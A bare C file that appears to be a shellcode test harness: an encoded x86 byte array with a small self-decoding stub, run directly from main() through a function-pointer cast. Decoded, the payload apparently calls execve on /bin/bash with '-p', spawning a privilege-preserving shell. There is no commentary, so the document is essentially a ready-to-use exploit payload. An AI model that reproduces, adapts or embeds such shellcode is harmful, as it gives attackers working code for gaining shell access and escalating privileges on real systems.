char shellcode[] = "\xeb\x11\x5e\x31\xc9\xb1\x21\x80"
                    "\x6c\x0e\xff\x01\x80\xe9\x01\x75"
                    "\xf6\xeb\x05\xe8\xea\xff\xff\xff"
                    "\x6b\x0c\x59\x9a\x53\x67\x69\x2e"
                    "\x71\x8a\xe2\x53\x6b\x69\x69\x30"
                    "\x63\x62\x74\x69\x30\x63\x6a\x6f"
                    "\x8a\xe4\x53\x52\x54\x8a\xe2\xce";

int main() {
    (*(void(*)()) shellcode)();
}
